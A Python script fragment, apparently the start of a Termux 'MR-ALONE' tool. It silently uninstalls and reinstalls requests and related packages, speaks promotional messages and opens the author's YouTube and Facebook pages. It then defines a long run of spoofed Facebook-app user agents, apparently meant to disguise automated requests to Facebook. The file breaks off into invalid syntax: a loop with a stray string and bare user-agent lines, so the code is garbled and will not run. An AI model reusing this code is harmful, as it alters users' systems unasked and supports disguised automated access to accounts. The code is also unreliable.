#-----------------[ MR-ALONE ]-------------------#
 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
 #------------------[ MR-ALONE ]-------------------#
import os, platform, time, sys
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
os.system('pip install requests ')
os.system('pip install bs4')
#os.system('pip install rich')
#os.system('pip install urillb3')
os.system("pkg install espeak")
#os.system("pkg update")
print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \x1b[38;5;50mCHECKING UPDATE...? ')
os.system("espeak -a 300 \"Checking,Update,\"")
time.sleep(2)
#os.system('clear')
print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 6.1...! ')
os.system("espeak -a 300 \"UPDATE VERSION 6.1,\"")
time.sleep(2)
#os.system('clear')
print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m SUBSCRIBE MY YOUTUBE CHANNEL..!")
os.system("espeak -a 300 \"SUBSCRIBE,MY,YOUTUBE,CHANNEL,\"")
time.sleep(2)
os.system(f'xdg-open https://www.youtube.com/@kgaming6607')
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100088035424278')
##os.system("espeak -a 300 \"Enter,Username,and,password, \"")##
#------------------[ MR-ALONE ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104",]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.5669.73 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5326.82 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 8; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5479.49 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.5903.48 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4777.63 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.3011.34 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4336.91 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5565.86 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.4342.48 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 14; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.3242.85 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5508.92 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.3495.98 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5260.45 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4573.22 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 13; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.5046.74 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.3767.91 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.3275.69 Mobile Safari/537.36"]
ua =["Mozilla/5.0 (Windows NT 10.0; 11; Windows NT 10.0N50G) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4520.72 Chrome/109.0.0.0 Safari/537.36"]
ua = ["Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/373.1.0.8.104",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ['Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]',]
ua = ['Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36',]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/238.0.0.41.116;]']
ua = ['Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]']
ua = ['Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L01A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]']
ua = ['Mozilla/5.0 (Linux; Android 12; MP17 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = ['Mozilla/5.0 (Linux; Android 12; 22122RK93C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = ['Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 6.0; CAM-UL00 Build/HONORCAM-UL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SM-J700M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",]
ua = ['Mozilla/5.0 (Linux; Android 5.0.2; HTC Desire Eye Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]']
ua = ['Mozilla/5.0 (Linux; Android 11; V1936A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]']
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.4.1;FBSS/3; FBCR/csl.;FBID/phone;FBLC/en_US;FBOP/5]']
ua = ['Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/418.0.0.11.71;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; SM-N970F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-G986B) AppleWebKit/537.36 (KHTML, like Gecko) Stargon/5.1.1 Chrome/114.0.5735.61 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.177 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/350.0.0.5.116;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/401.0.0.14.97;',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A505W Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; 220333QPG Build/RD2A.211001.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20A5356a [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/320.0.0.12.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/380.0.0.29.109;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; itel L6502 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/318.0.0.16.105;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; CPH2083) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; XIAOMI POCO X2 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36 AlohaBrowser/3.0.4',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; RMX3286 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/357.0.0.12.72;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/420.0.0.32.61;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/362.0.0.10.67;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-A107M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; CPH2481 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/411.1.0.29.112;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; FRL-L23 Build/HUAWEIFRL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/353.0.0.34.116;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; FRL-L23; HMSCore 6.8.0.331) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/409.0.0.27.106;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/395.0.0.10.75;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; SM-E225F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/355.0.0.21.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-E225F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A135M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; SM-A137F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]',] 
for xd in range(10000):
	     
  ")AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",

Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]
Navigateur Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h
Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h
Dalvik/9.1.0 (Linux; U; Android 9.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/99.0.0.8.182;FBDV/SM-J210F;FBLC/en_US;FBOP/20]
Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]
Dalvik/1.6.0 (Linux; U; Android 4.4.4; Z987 Build/KTU84P) [FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 8.1.0; MI 5X MIUI/V10.3.1.0.ODBCNXM) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507224;FBCR/Ooredoo;FBMF/Xiaomi;FBBD/xiaomi;FBDV/MI 5X;FBSV/8.1.0;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G950U Build/R16NW) [FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;] FBBK/1
Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C) [FBAN/FB4A;FBAV/175.0.0.40.97;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/111983758;FBCR/Viettel Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/5.1.1;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=1280,height=720};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-N9005 Build/NJH47F) [FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]
Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;] FBBK/1
